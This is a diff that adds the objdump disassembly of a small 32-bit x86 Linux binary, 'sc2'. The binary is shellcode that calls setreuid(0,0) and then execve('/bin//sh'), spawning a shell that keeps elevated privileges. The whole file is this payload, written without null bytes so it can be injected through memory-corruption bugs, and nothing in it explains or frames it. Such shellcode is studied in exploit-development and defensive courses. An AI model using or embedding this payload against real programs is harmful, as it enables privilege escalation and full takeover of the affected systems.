@@ -1,0 +1,23 @@
+
+sc2:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048060 <_start>:
+ 8048060:	31 c0                	xor    %eax,%eax
+ 8048062:	b0 46                	mov    $0x46,%al
+ 8048064:	31 db                	xor    %ebx,%ebx
+ 8048066:	31 c9                	xor    %ecx,%ecx
+ 8048068:	cd 80                	int    $0x80
+ 804806a:	31 c0                	xor    %eax,%eax
+ 804806c:	50                   	push   %eax
+ 804806d:	68 2f 2f 73 68       	push   $0x68732f2f
+ 8048072:	68 2f 62 69 6e       	push   $0x6e69622f
+ 8048077:	89 e3                	mov    %esp,%ebx
+ 8048079:	50                   	push   %eax
+ 804807a:	53                   	push   %ebx
+ 804807b:	89 e1                	mov    %esp,%ecx
+ 804807d:	31 d2                	xor    %edx,%edx
+ 804807f:	b0 0b                	mov    $0xb,%al
+ 8048081:	cd 80                	int    $0x80
